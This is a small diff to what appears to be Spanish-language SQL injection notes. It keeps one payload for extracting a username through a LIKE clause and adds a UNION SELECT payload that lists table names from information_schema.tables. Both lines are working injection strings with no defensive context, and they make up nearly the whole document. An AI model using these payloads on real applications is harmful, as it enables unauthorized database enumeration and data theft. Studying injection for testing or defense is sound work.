@@ -6,3 +6,6 @@ Para obtener un username
 
 ' OR user LIKE '%edd%
 
+Para obtener nombres de las tablas
+1 UNION SELECT table_schema, 1, table_name,2 FROM information_schema.tables
+
